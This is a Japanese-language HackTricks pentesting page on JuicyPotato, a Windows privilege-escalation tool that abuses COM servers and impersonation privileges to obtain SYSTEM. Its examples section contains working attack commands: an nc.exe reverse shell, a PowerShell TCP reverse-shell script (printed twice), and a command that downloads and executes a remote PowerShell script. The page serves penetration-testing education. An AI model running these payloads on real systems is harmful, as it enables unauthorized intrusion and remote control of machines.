# JuicyPotato

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたい**ですか？または、**HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有する**ために、[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>

{% hint style="warning" %}
**JuicyPotatoは**Windows Server 2019とWindows 10ビルド1809以降では動作しません。ただし、[**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**、**[**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**、**[**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)を使用して、同じ特権を利用して`NT AUTHORITY\SYSTEM`レベルのアクセスを取得することができます。_**チェック:**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato (黄金特権の悪用) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_RottenPotatoNG_の砂糖を加えたバージョンで、つまり**WindowsサービスアカウントからNT AUTHORITY\SYSTEMへのローカル特権エスカレーションツール**です。

#### juicypotatoは[https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)からダウンロードできます。

### 概要 <a href="#summary" id="summary"></a>

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)とその[バリエーション](https://github.com/decoder-it/lonelypotato)は、[`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [サービス](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126)に基づく特権エスカレーションチェーンを利用します。MiTMリスナーは`127.0.0.1:6666`で動作し、`SeImpersonate`または`SeAssignPrimaryToken`の特権を持っている場合に使用されます。Windowsビルドのレビュー中に、意図的に`BITS`が無効にされ、ポート`6666`が使用されているセットアップを見つけました。

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)を武器化することにしました：**Juicy Potato**をご紹介します。

> 理論については、[Rotten Potato - サービスアカウントからSYSTEMへの特権エスカレーション](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)を参照し、リンクと参照の連鎖をたどってください。

私たちは、`BITS`以外にも悪用できるいくつかのCOMサーバーがあることを発見しました。これらのサーバーは次の条件を満たす必要があります。

1. 現在のユーザーによってインスタンス化可能であること（通常は「サービスユーザー」で、模倣特権を持っています）
2. `IMarshal`インターフェースを実装すること
3. 昇格されたユーザー（SYSTEM、Administratorなど）として実行すること

いくつかのテストの結果、いくつかのWindowsバージョンで興味深い[CLSIDのリスト](http://ohpe.it/juicy-potato/CLSID/)を取得し、テストしました。

### Juicyの詳細 <a href="#juicy-details" id="juicy-details"></a>

JuicyPotatoを使用すると、次のことができます。

* **ターゲットのCLSID** _好きなCLSIDを選択します。_ [_ここ_](http://ohpe.it/juicy-potato/CLSID/) _でOSごとに整理されたリストを見つけることができます。_
* **COMリスニングポート** _マーシャリングされたハードコードされた6666の代わりに、好きなCOMリスニングポートを定義します。_
* **COMリスニングIPアドレス** _サーバーを任意のIPにバインドします。_
* **プロセス作成モード** _模倣されたユーザーの特権に応じて、次から選択できます。_
* `CreateProcessWithToken`（`SeImpersonate`が必要）
* `CreateProcessAsUser`（`SeAssignPrimaryToken`が必要）
* `both`
* **起動するプロセス** _エクスプロイトが成功した場合に実行する実行可能ファイルまたはスクリプトを起動します。_
* **プロセス引数** _起動するプロセスの引数をカスタマイズします。_
* **RPCサーバーアドレス** _ステルスアプローチのために、外部のRPCサーバーに認証することができます。_
* **RPCサーバーポート** _外部サーバーに認証する場合に便利ですが、ファイアウォールがポート`135`をブロックしている場合..._
* **テストモード** _主にテスト目的で使用します。つまり、CLSIDのテストです。DCOMを作成し、トークンのユーザーを表示します。テストについては_ [_こちらを参照してください_](http://ohpe.it/juicy-potato/Test/)
### 使用方法 <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### 最終的な考え <a href="#final-thoughts" id="final-thoughts"></a>

ユーザーが `SeImpersonate` または `SeAssignPrimaryToken` 特権を持っている場合、あなたは **SYSTEM** です。

これらのすべての COM サーバーの乱用を防ぐことはほぼ不可能です。`DCOMCNFG` を介してこれらのオブジェクトのアクセス許可を変更することを考えることができますが、がんばってください、これは困難になるでしょう。

実際の解決策は、`* SERVICE` アカウントで実行される機密アカウントとアプリケーションを保護することです。`DCOM` を停止すると、このエクスプロイトは確かに阻止されますが、基になる OS に重大な影響を与える可能性があります。

参照元: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## 例

注意: 試すための CLSID のリストについては、[このページ](https://ohpe.it/juicy-potato/CLSID/)を参照してください。

### nc.exe の逆シェルを取得する
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev

Powershellのrev

```powershell
$socket = New-Object System.Net.Sockets.TCPClient('10.10.10.10', 1234)
$stream = $socket.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$socket.Close()
```

Powershellのrev

```powershell
$socket = New-Object System.Net.Sockets.TCPClient('10.10.10.10', 1234)
$stream = $socket.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$socket.Close()
```
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### 新しいCMDを起動する（RDPアクセスがある場合）

![](<../../.gitbook/assets/image (37).png>)

## CLSIDの問題

しばしば、JuicyPotatoが使用するデフォルトのCLSIDは**機能しない**ため、エクスプロイトが失敗します。通常、**動作するCLSID**を見つけるために複数の試行が必要です。特定のオペレーティングシステムに対して試すためのCLSIDのリストを取得するには、次のページを参照してください：

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **CLSIDの確認**

まず、juicypotato.exe以外のいくつかの実行可能ファイルが必要です。

[Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1)をダウンロードし、PSセッションにロードし、[GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1)をダウンロードして実行します。このスクリプトは、テストする可能性のあるCLSIDのリストを作成します。

次に、[test\_clsid.bat](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)（CLSIDリストとjuicypotato実行可能ファイルのパスを変更してください）をダウンロードして実行します。すべてのCLSIDを試し始め、**ポート番号が変わると、CLSIDが機能したことを意味します**。

パラメータ -c を使用して、**動作するCLSIDを確認**します。

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしてください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
